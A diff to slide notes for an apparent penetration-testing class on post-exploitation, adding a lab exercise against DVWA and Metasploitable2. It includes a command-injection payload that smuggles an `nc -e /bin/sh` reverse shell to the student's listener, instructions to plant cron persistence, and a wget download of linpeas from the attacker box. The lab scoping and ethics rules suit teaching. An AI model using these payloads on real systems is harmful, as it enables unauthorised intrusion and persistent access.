@@ -26,7 +26,7 @@ RUN SHEET (~85 min). TWO-PART DAY — two disciplines. Treat it as such:
 00:00 Journey check + hook (low-priv -> root in 20s)           4   ┐
 00:04 What a shell is + the post-ex goals                      5   │
 00:09 Privilege escalation                                    10   │ PART 1
-00:19 DO: shell -> linpeas -> priv-esc on Metasploitable2     16   │ (post-ex,
+00:19 DO: shell -> priv-esc — Path A (MS2) or B (DVWA webshell) 16   │ (post-ex,
 00:35 Persistence / lateral movement / pivoting                8   │  done by :48)
 00:43 The attack chain + detection opportunities               7   ┘
 00:50 Infrastructure security                                  8   ┐
@@ -34,13 +34,15 @@ RUN SHEET (~85 min). TWO-PART DAY — two disciplines. Treat it as such:
 01:06 DO: fix an open bucket / IAM policy                     10   │ (infra + cloud)
 01:16 Attack <-> defence + wrap + homework                     4   ┘
 CUT FIRST IF SHORT: persistence/lateral/pivot slide to 4 min; infra slide to a 4-min bullet run.
-NEVER CUT: privilege escalation + the priv-esc DO, the attack-chain-with-detection artifact,
+NEVER CUT: privilege escalation + the priv-esc DO (Path A or B — pick ONE per class, don't run
+both in the 16 min unless clearly ahead of schedule), the attack-chain-with-detection artifact,
 shared responsibility, the bucket/IAM DO.
 ANALOGY (kitchen): post-ex = you're inside after hours. Get the master key (priv-esc), prop a
 door for later (persistence), move kitchen -> office -> safe (lateral movement), use the
 restaurant's van to reach the warehouse (pivoting). Cloud = a chain of restaurants sharing one
 supplier who says "we lock the building; what's in your unit is your problem".
 ETHICS: Metasploitable2 / assigned lab target only (the ROE). Post-ex stays on that box.
+Own lab: Metasploitable2 `10.89.1.10`, DVWA `10.89.1.20` for the web-shell path.
 -->
 
 ---
@@ -122,19 +124,33 @@ crash the box).
 
 ## Do it now — shell → escalate
 
-Guided, on `<LAB_HOST>` (Metasploitable2):
+Guided, two paths — pick one (or both if time):
 
-1. Get a shell (Metasploit module from Day 15, or `nc` from a web RCE).
+**Path A — Metasploitable2 (`10.89.1.10`), a known-service exploit:**
+
+1. Get a shell (a Metasploit module from Day 15's vsftpd/distcc/Samba findings, or `nc`).
 2. Enumerate: `id`, `sudo -l`, `find / -perm -4000 -type f 2>/dev/null`, `uname -a`
    — or run `linpeas.sh` (transfer it first).
 3. **Find one escalation path.** Take it.
 4. `id` → confirm root. **Screenshot the whole chain** (start user → command → root).
 
+**Path B — DVWA (`10.89.1.20`), a web-app bug into a shell:**
+
+1. DVWA → **Command Injection** page → `127.0.0.1; nc -e /bin/sh <your-IP> 4444` while
+   `nc -lvnp 4444` listens on your attacker box → you have a shell as the web server.
+2. That IS a backdoor: the input box became your remote command line. Plant persistence —
+   a cron entry or a small script the shell can re-trigger later — and note it in your
+   Engagement Journal so it gets **removed**, not left behind.
+
 <!--
-16 min. Metasploitable2 has many paths: the `distcc`/`udev`/`nfs` routes, an old kernel,
-world-writable cron. Coach the same way as Day 15.
+16 min. Path A: Metasploitable2 has many escalation routes — `distcc`/`udev`/`nfs`, an old
+kernel, world-writable cron. Coach the same way as Day 15.
 linpeas: `wget http://<your-kali>/linpeas.sh` on the target (host it with `python3 -m http.server`).
-Non-root -> root is the proof. This is Phase 5 of the engagement journal.
+Path B is the Day-16 command-injection bug taken one step further: same bug, this time used
+to open a shell instead of just proving RCE with `whoami`. It's the shortest, clearest 'a web
+bug became a backdoor' demo in the whole course — use it if the class is behind on Metasploit.
+Non-root -> root (Path A) or a live reverse shell (Path B) is the proof. This is Phase 5 of the
+engagement journal either way.
 -->
 
 ---
@@ -143,6 +159,7 @@ Non-root -> root is the proof. This is Phase 5 of the engagement journal.
 
 - **Persistence** — a way back in that survives a reboot: a cron job, a new service, an added
   SSH key, a Windows Run key / scheduled task (Day 8). *"If they reboot, am I still in?"*
+  (Path B above planted exactly this kind of persistence via the DVWA command injection.)
 - **Lateral movement** — reuse what you found (passwords, hashes, SSH keys, tokens) to hop to
   the **next** box. *pass-the-hash*, reused local-admin passwords (Day 8 → LAPS), SSH key reuse.
 - **Pivoting** — route your traffic **through** the compromised host to reach networks you
